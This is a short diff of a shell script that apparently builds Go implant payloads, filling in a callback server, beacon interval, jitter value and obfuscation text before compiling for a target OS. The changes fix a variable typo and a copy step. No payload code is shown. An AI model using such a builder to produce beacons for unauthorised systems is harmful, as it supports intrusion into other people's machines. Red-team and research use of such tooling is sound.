@@ -21,14 +21,13 @@ else
     echo "unknown payload type"
     exit
 fi
-echo $payloadpath
 echo "[+] Copying files..."
 
 cp $payloadpath tmp1.go
 
 sed -i "s/&&SERV&&/${servervar}/g" tmp1.go
 sed -i "s/&&INTERVAL&&/${intervalvar}/g" tmp1.go
-sed -i "s/&&DELTA&&/${deltavarvar}/g" tmp1.go
+sed -i "s/&&DELTA&&/${deltavar}/g" tmp1.go
 sed -i "s/&&OBFTEXT&&/${obftextvar}/g" tmp1.go
 
 echo "[+] Fetching package"
@@ -42,4 +41,5 @@ export goos=$targetos
 go build tmp1.go -o $outputbin
 
 echo "[+] Cleaning up..."
+cp tmp1 $outputbin
 rm tmp1.go
